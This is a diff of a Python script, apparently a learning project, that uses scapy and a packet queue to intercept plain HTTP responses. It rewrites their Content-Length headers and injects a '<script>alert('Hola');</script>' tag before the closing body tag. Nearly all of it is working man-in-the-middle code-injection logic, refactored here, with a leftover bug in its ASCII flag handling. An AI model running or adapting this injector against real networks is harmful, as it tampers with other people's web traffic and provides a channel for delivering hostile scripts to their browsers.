@@ -7,14 +7,37 @@ import re
 
 
 def get_content_len(response_header):
-    regex = "(?<=Content-Length: )[^.\\r\\n]*"
+    regex = "(?:(Content-Length:\s))(\d*)"
     original_len = re.search(regex, response_header)
-    return int(original_len.group(0))
+
+    return int(original_len.group(2))
 
 
 def recalculate_content_len(original, injection, key_word):
     new = original + len(injection) - len(key_word)
     return new
+
+
+def modify_content_len(load, injection, key_word, is_ascii):
+    """Detects the Cl of the load and modifies it"""
+
+    if "Content-Type: text" in load and "Content-Length:" in load:  # If it has length and its text
+        print("With html content type, CHANGING LEN")
+
+        length = get_content_len(load)
+        print("Original len: " + str(length))
+        new_length = recalculate_content_len(length, injection, key_word)
+        print("New len: " + str(new_length))
+
+        if is_ascii:
+            new_load = re.sub("(?<=Content-Length: )[^.\\r\\n]*", str(new_length), load)
+            return new_load
+        else:
+            new_load = re.sub(str(length), str(new_length), load)
+            return new_load
+    else:
+        print("No es html!! o no es necesario cambiar lenght")
+        return load
 
 
 def set_load(s_packet, load):
@@ -28,9 +51,24 @@ def set_load(s_packet, load):
     return s_packet
 
 
+def get_load(scapy_packet):
+    try:
+        load = scapy_packet[scapy.Raw].load.decode("utf-8")  # Errors when non ascii chars in the packets!
+        print("Ascii")
+    except UnicodeDecodeError:
+        print("No asci")
+        is_ascii = False
+        load = str(scapy_packet[scapy.Raw].load)
+        load = re.search("(?<=b')[^'*]*", load).group(0)
+        print(load)
+
+    return load
+
+
 def process_packet(packet):
     """When a packet arrives this function is called"""
 
+    is_ascii = True
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
         if scapy_packet[scapy.TCP].dport == 80:
@@ -46,37 +84,19 @@ def process_packet(packet):
             injection = "<script>alert('Hola');</script></body>"
             key_word = "</body>"
 
-            try:
-                load = scapy_packet[scapy.Raw].load.decode("utf-8")  # Errors when non ascii chars in the packets!
-            except UnicodeDecodeError:
-                print("No asciiii")
-                print(str(scapy_packet[scapy.Raw].load))
-                packet.accept()
-                return
+            load = get_load(scapy_packet)
 
-            if "Content-Length:" in load:
+            if "HTTP/" in load:  # If it is a header packet:
+                new_load = modify_content_len(load, injection, key_word, is_ascii)
 
-                print("Headers: \n" + load)
-                length = get_content_len(load)
-                print("Original len:" + str(length))
-                new_length = recalculate_content_len(length, injection, key_word)
-                print("New len: " + str(new_length))
-
-                new_load = re.sub("(?<=Content-Length: )[^.\\r\\n]*", str(new_length), load)  # Not accept encoding so receive http data in plain text
                 mod_packet = set_load(scapy_packet, new_load)
-                print("[+] MODIFIED Response packet: ")
-                print(mod_packet.show())
 
                 packet.set_payload(bytes(mod_packet))
                 load = scapy_packet[scapy.Raw].load.decode("utf-8")
 
             if "</body>" in load:
                 new_load = load.replace("</body>", injection)
-
                 mod_packet = set_load(scapy_packet, new_load)
-
-                print("[+] FINAL MODIFIED Response packet: ")
-                print(mod_packet.show())
                 packet.set_payload(bytes(mod_packet))
 
     packet.accept()
